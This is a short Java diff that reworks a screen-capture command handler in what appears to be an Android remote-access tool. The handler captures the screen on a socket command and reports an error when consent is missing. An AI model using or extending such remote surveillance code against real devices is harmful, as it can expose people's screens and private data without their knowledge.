@@ -331,8 +331,17 @@ public class ConnectionManager {
     }
 
     public static void x0000sc() {
-        if (MainService.getScreenData() != null) {
-            new ScreenManager(context).captureScreen(MainService.getScreenResultCode(), MainService.getScreenData());
+        try {
+            if (MainService.getMediaProjection() != null) {
+                new ScreenManager(context).captureScreen(MainService.getMediaProjection());
+            } else {
+                JSONObject error = new JSONObject();
+                error.put("image", false);
+                error.put("error", "screen-capture consent not granted at launch");
+                ioSocket.emit("x0000sc", error);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
